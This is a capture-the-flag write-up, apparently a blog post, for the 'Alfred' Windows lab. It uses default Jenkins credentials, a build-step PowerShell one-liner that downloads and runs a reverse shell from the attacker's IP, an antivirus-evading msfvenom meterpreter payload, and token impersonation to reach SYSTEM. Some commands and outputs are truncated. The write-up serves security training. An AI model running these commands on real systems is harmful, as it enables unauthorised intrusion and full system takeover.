### <span style="color:blue"> [Task 1] - Initial Access </span>

#### 1. How many ports are open? (TCP only)

To answer this question, we run a Nmap scan:

```
$ nmap -sC -sV -A $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-15 11:10 CEST
Nmap scan report for 10.10.31.231

```

The answer is **3**.


#### 2. What is the username and password for the log in panel(in the format username:password)
By navigating port 8080, we retrieve the login page of Jenkins. By searching on Google the default credentials of Jenkins, we get the credentials **admin:admin**.
By using these credentials, we obtain access.

<img src="/assets/img/posts/alfred/meme_task1.jpg" width="50%" height="50%">


#### 3. Execute Command and Get Access

> Find a feature of the tool that allows you to execute commands on the underlying system. When you find this feature, you can use this command to get the reverse shell on your machine and then run it: powershell iex (New-Object Net.WebClient).DownloadString('http://your-ip:your-port/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
> 
> You first need to download the Powershell script, and make it available for the server to download. You can do this by creating a http server with python: python3 -m http.server


To do this task, we need to find a place in which we can put commands to execute. In the Jenkins project, we can configure the build. So, if we enter in the project section, in the menù on the side we have the **Configure** voice:

![Configure section](/assets/img/posts/alfred/config_build.png)


If we enter this section, we have many configurations, but what interested us is the **"Build"** section at the bottom of the page. In particular, in this section, we see the "Execute Windows batch command" area in which we can put command.

Before inserting a command, we need to run a python server and a listener. Indeed, we need the python server because of the command that we will use to download a PowerShell script to execute a reverse shell to our listener.
So, we copy the script Invoke-PowerShellTcp.ps1 (that you can find [here](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)) in the folder from which we run our python server and, then we start the server:
```
python -m SimpleHTTPServer 8000
```

Then, we start a listener:
```
rlwrap nc -nlvp 5555
```

Now, in the "Execute Windows batch command" area, we put the following command:

```
powershell iex (New-Object Net.WebClient).DownloadString('http://10.8.80.159:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.80.159 -Port 5555
```

![CommandConfigure](/assets/img/posts/alfred/command.png)

We save the configuration and on the page of the project, we can click on the "Build Now" voice.

![Build Now](/assets/img/posts/alfred/build_now.png)


After a brief time, we can return on our listener and we have a low-privilege shell:
```
rlwrap nc -nlvp 5555
listening on [any] 5555 ...
connect to [10.8.80.159] from (UNKNOWN) [10.10.243.42] 49412
Windows PowerShell running as user bruce on ALFRED

PS C:\Program Files (x86)\Jenkins\workspace\project>whoami
alfred\bruce
```


#### 4. What is the user.txt flag? 
We can read the **"C:\users\bruce\desktop\user.txt"** file and retrieve the flag.



### <span style="color:blue"> [Task 2] - Switching Shells </span>

> To make the privilege escalation easier, let's switch to a meterpreter shell using the following process.
> 
> Use msfvenom to create the a windows meterpreter reverse shell using the following payload
> msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
> 
> 
> This payload generates an encoded x86-64 reverse tcp meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly, and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.
> 
> After creating this payload, download it to the machine using the same method in the previous step:
> powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
> 
> Before running this program, ensure the handler is set up in metasploit:
> use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
> 
> 
> ﻿This step uses the metasploit handler to receive the incoming connection from you reverse shell. Once this is running, enter this command to start the reverse shell
> 
> Start-Process "shell-name.exe"
> 
> This should spawn a meterpreter shell for you!


Since the shell that we obtain before is unstable, we use Metasploit to get a more stable shell.

#### 1. What is the final size of the exe payload that you generated?
We generate the payload that will be used to retrieve a reverse shell:
```
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.8.80.159 LPORT=4444 -f exe -o shell.exe 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 381 (iteration=0)
x86/shikata_ga_nai chosen with final size 381
Payload size: 381 bytes
Final size of exe file: 73802 bytes
Saved as: shell.exe
```

The answer is **73802**.

Now, we upload the malicious payload on the machine. 
We, first, run a python server on our Kali machine:
```
python -m
```
Then from our unstable shell on the victim machine, we run from this:
```
powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')"
```
This command will download the shell.exe that we had to generate.

Now, we set a listener on Metasploit by using the multi/handler module:
```
use exploit/multi/handler 
set PAYLOAD windows/meterpreter/reverse_tcp 
set LHOST your-ip 
set LPORT listening-port 
run
```

And, finally, from the victim machine we run the shell.exe, by executing:
```
Start-Process "shell.exe"
```

By returning in the listener we have a stable shell:
```
msf6 exploit(multi/handler) > run

### <span style="color:blue"> [Task 3] - Privilege Escalation </span>

> Now that we have initial access, let's use token impersonation to gain system access.
> 
> Windows uses tokens to ensure that accounts have the right privileges to carry out particular actions. Account tokens are assigned to an account when users log in or are authenticated. This is usually done by LSASS.exe(think of this as an authentication process).
> 
> This access token consists of:
> 
>    - user SIDs(security identifier)
>    - group SIDs
>    - privileges
> 
> amongst other things. More detailed information can be found here.
> 
> There are two types of access tokens:
> 
>    - primary access tokens: those associated with a user account that are generated on log on
>    - impersonation tokens: these allow a particular process(or thread in a process) to gain access to resources using the token of another (user/client) process
> 
> For an impersonation token, there are different levels:
> 
>    - SecurityAnonymous: current user/client cannot impersonate another user/client
>    - SecurityIdentification: current user/client can get the identity and privileges of a client, but cannot impersonate the client
>    - SecurityImpersonation: current user/client can impersonate the client's security context on the local system
>    - SecurityDelegation: current user/client can impersonate the client's security context on a remote system
> 
> where the security context is a data structure that contains users' relevant security information.
> 
> The privileges of an account(which are either given to the account when created or inherited from a group) allow a user to carry out particular actions. Here are the most commonly abused privileges:
> 
>    - SeImpersonatePrivilege
>    - SeAssignPrimaryPrivilege
>    - SeTcbPrivilege
>    - SeBackupPrivilege
>    - SeRestorePrivilege
>    - SeCreateTokenPrivilege
>    - SeLoadDriverPrivilege
>    - SeTakeOwnershipPrivilege
>    - SeDebugPrivilege
> 
> There's more reading [here](https://www.exploit-db.com/papers/42556).



#### 1. View all the privileges using whoami /priv

We want to view the privilege that the user has, then we run the command ```whoami /priv```:

```
C:\Program Files (x86)\Jenkins\workspace\project>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
SeDebugPrivilege                Debug programs                            Enabled 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

In this list, we can note that the **SeImpersonatePrivilege** privilege is enabled for our user. With this privilege, you permit programs that run on behalf of that user to impersonate a client.
So, you can get a SYSTEM token from a Windows service (DCOM) force to perform an NTLM authentication against the exploit and then successfully execute a process as SYSTEM. There are many ways to exploit this vulnerability, you can use juicy-potato, SweetPotato, RogueWinRM, PrintSpoofer.

But in this task the **incognito** module of Metasploit is used.

#### 2. Incognito Module
> You can see that two privileges(SeDebugPrivilege, SeImpersonatePrivilege) are enabled. Let's use the incognito module that will allow us to exploit this vulnerability. Enter: load incognito to load the incognito module in metasploit. Please note, you may need to use the use incognito command if the previous command doesn't work. Also ensure that your metasploit is up to date.

We load the incognito module, by running the command ```load incognito```:
```
meterpreter > load incognito
Loading extension incognito...Success.
```

#### 3. Impersonate Token
> To check which tokens are available, enter the list_tokens -g. We can see that the BUILTIN\Administrators token is available. Use the impersonate_token "BUILTIN\Administrators" command to impersonate the Administrators token. What is the output when you run the getuid command?

We use the command ```list_tokens -g``` to retrieve all the available token:
```
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\IIS_IUSRS
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization
NT AUTHORITY\WRITE RESTRICTED

NT SERVICE\TrustedInstaller
NT SERVICE\UmRdpService
NT SERVICE\UxSms
NT SERVICE\WdiSystemHost
NT SERVICE\WinDefend
NT SERVICE\Winmgmt
NT SERVICE\WSearch

Impersonation Tokens Available
========================================
NT AUTHORITY\NETWORK
NT SERVICE\AudioSrv
NT SERVICE\CryptSvc
NT SERVICE\DcomLaunch
NT SERVICE\Dhcp
NT SERVICE\DPS
NT SERVICE\LanmanWorkstation
NT SERVICE\lmhosts
NT SERVICE\MpsSvc
NT SERVICE\PolicyAgent
NT SERVICE\Power
NT SERVICE\wscsvc
```

We note that the **BUILTIN\Administrators** token is available. Since we want to elevate our privilege we can use this token by using the command ```impersonate_token```:
```
meterpreter > impersonate_token "BUILTIN\Administrators"
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
```

The impersonate command has finished with success, so we check our ID:
```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

We are SYSTEM, so the answer is **NT AUTHORITY\SYSTEM**.

#### 4. Migrate Process
> Even though you have a higher privileged token you may not actually have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do). Ensure that you migrate to a process with correct permissions (above questions answer). The safest process to pick is the services.exe process. First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS

Since it is possible that even though we have a privileged token we may not have the permission of the privileged user. So we can migrate our process to another SYSTEM process.
First, we check the available processes, by running the command ```ps```:
```
meterpreter > ps
